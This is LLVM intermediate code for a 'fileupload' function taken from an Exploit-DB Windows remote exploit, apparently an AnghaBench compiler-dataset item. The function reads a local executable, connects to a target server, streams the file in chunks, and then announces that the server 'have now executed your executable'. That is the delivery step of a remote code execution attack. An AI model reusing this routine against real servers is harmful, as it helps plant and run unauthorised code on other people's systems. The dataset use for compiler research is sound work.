; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_439.c_fileupload.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_439.c_fileupload.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [18 x i8] c"[+] Opening File\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"rb\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"[-] Open Failed\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[+] File found ready to send\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"[-] GetHostByName() Error!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c"[-] Can't open socket!\0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[-] Connecting error\0A\00", align 1
@.str.7 = private unnamed_addr constant [39 x i8] c"[+] Connected\0A[+] Sending executable.\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"[-] Sending executable failed\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.10 = private unnamed_addr constant [58 x i8] c"\0A[+] All done, server have now executed your executable!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @fileupload(i32 %0, i8* %1, i8* %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i8* null, i8** %14, align 8
  store i32 0, i32* %15, align 4
  %16 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  %17 = load i8*, i8** %6, align 8
  %18 = call i32* @fopen(i8* %17, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %18, i32** %8, align 8
  %19 = load i32*, i32** %8, align 8
  %20 = icmp eq i32* %19, null
  br i1 %20, label %21, label %23

21:                                               ; preds = %3
  %22 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %82

23:                                               ; preds = %3
  %24 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %25 = load i8*, i8** %7, align 8
  %26 = call %struct.hostent* @gethostbyname(i8* %25)
  store %struct.hostent* %26, %struct.hostent** %11, align 8
  %27 = icmp eq %struct.hostent* %26, null
  br i1 %27, label %28, label %30

28:                                               ; preds = %23
  %29 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %82

30:                                               ; preds = %23
  %31 = load i32, i32* @AF_INET, align 4
  %32 = load i32, i32* @SOCK_STREAM, align 4
  %33 = call i32 @socket(i32 %31, i32 %32, i32 0)
  store i32 %33, i32* %9, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %30
  %36 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %82

37:                                               ; preds = %30
  %38 = load i32, i32* @AF_INET, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %38, i32* %39, align 4
  %40 = load i32, i32* %5, align 4
  %41 = call i32 @htons(i32 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %41, i32* %42, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %44 = load %struct.hostent*, %struct.hostent** %11, align 8
  %45 = getelementptr inbounds %struct.hostent, %struct.hostent* %44, i32 0, i32 0
  %46 = load i64, i64* %45, align 8
  %47 = inttoptr i64 %46 to %struct.in_addr*
  %48 = bitcast %struct.in_addr* %43 to i8*
  %49 = bitcast %struct.in_addr* %47 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %48, i8* align 4 %49, i64 4, i1 false)
  %50 = load i32, i32* %9, align 4
  %51 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 4)
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %56

54:                                               ; preds = %37
  %55 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %82

56:                                               ; preds = %37
  %57 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  br label %58

58:                                               ; preds = %75, %56
  %59 = load i32*, i32** %8, align 8
  %60 = call i32 @feof(i32* %59)
  %61 = icmp ne i32 %60, 0
  %62 = xor i1 %61, true
  br i1 %62, label %63, label %77

63:                                               ; preds = %58
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %65 = load i32*, i32** %8, align 8
  %66 = call i32 @fread(i8* %64, i32 1, i32 1024, i32* %65)
  store i32 %66, i32* %15, align 4
  %67 = call i32 @Sleep(i32 200)
  %68 = load i32, i32* %9, align 4
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %70 = load i32, i32* %15, align 4
  %71 = call i32 @send(i32 %68, i8* %69, i32 %70, i32 0)
  store i32 %71, i32* %10, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %75

73:                                               ; preds = %63
  %74 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %4, align 4
  br label %82

75:                                               ; preds = %63
  %76 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  br label %58

77:                                               ; preds = %58
  %78 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.10, i64 0, i64 0))
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @closesocket(i32 %79)
  %81 = call i32 (...) @WSACleanup()
  store i32 1, i32* %4, align 4
  br label %82

82:                                               ; preds = %77, %73, %54, %35, %28, %21
  %83 = load i32, i32* %4, align 4
  ret i32 %83
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @feof(i32*) #1

declare dso_local i32 @fread(i8*, i32, i32, i32*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
